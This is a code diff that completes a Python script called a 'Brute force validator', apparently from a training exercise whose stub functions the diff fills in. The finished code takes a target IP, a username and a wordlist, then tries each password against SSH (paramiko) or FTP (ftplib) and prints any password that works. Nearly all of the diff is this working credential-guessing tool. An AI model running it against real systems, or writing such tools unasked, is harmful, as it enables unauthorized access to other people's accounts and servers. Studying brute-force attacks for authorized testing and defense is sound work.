@@ -73,79 +73,89 @@ except ImportError:
 
 
 def parse_arguments():
-    """
-    Define and parse command-line arguments.
+    parser = argparse.ArgumentParser(description="Brute force validator")
 
-    Returns the parsed namespace object.
-    Required: target (positional), --service, --user, --wordlist
-    """
-    # TODO: Implement argparse
-    # --service must be constrained to choices: ['ssh', 'ftp']
-    pass
+    parser.add_argument("target", help="Target IP address")
+
+    parser.add_argument("--service", required=True, choices=["ssh", "ftp"])
+
+    parser.add_argument("--user", required=True)
+
+    parser.add_argument("--wordlist", required=True, type=Path)
+
+    parser.add_argument("--port", type=int, default=None)
+
+    return parser.parse_args()
 
 
 def load_wordlist(wordlist_path: Path) -> list[str]:
-    """
-    Load passwords from a wordlist file.
+    if not wordlist_path.exists():
+        raise FileNotFoundError("Wordlist not found")
 
-    Args:
-        wordlist_path: Path to the wordlist file.
+    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
+        words = []
+        for line in f:
+            line = line.strip()
+            if line:
+                words.append(line)
 
-    Returns:
-        List of password strings with empty lines and whitespace stripped.
-
-    Raises:
-        FileNotFoundError: If wordlist does not exist.
-    """
-    # TODO: Implement wordlist loading
-    # Handle: empty lines, non-ASCII bytes (use errors='ignore' on open)
-    pass
+    return words
 
 
 def attempt_ftp(target: str, user: str, password: str) -> bool:
-    """
-    Attempt FTP authentication using ftplib.
-
-    Args:
-        target:   IP address string.
-        user:     Username string.
-        password: Password string to test.
-
-    Returns:
-        True if authentication succeeds, False otherwise.
-    """
-    # TODO: Implement FTP auth attempt
-    # Handle: connection refused, timeout, authentication error
-    # Do NOT let exceptions propagate — return False on any failure
-    pass
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(target, 21, timeout=2)
+        ftp.login(user=user, passwd=password)
+        ftp.quit()
+        return True
+    except Exception:
+        return False
 
 
 def attempt_ssh(target: str, user: str, password: str) -> bool:
-    """
-    Attempt SSH authentication using paramiko.
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-    Args:
-        target:   IP address string.
-        user:     Username string.
-        password: Password string to test.
+        client.connect(
+            hostname=target,
+            username=user,
+            password=password,
+            timeout=2,
+            allow_agent=False,
+            look_for_keys=False,
+        )
 
-    Returns:
-        True if authentication succeeds, False otherwise.
-    """
-    # TODO: Implement SSH auth attempt
-    # Use paramiko.SSHClient with AutoAddPolicy for host key
-    # Handle: AuthenticationException, SSHException, socket errors
-    # Do NOT let exceptions propagate — return False on any failure
-    pass
+        client.close()
+        return True
+
+    except Exception:
+        return False
 
 
 def main():
     args = parse_arguments()
-    # TODO: Wire parse_arguments → load_wordlist → attempt loop
-    # Remember: time.sleep(0.1) between EVERY attempt
-    # Log each attempt to a file for the evidence trail
-    pass
 
+    try:
+        passwords = load_wordlist(args.wordlist)
+    except Exception:
+        sys.exit(1)
+
+    for password in passwords:
+
+        time.sleep(0.1)
+
+        if args.service == "ftp":
+            success = attempt_ftp(args.target, args.user, password)
+        else:
+            success = attempt_ssh(args.target, args.user, password)
+
+        if success:
+            print(f"[+] SUCCESS: Password found: {password}")
+            return
+
+    print(f"[-] EXHAUSTED: No valid credentials found for user {args.user}")
 
 if __name__ == "__main__":
     main()
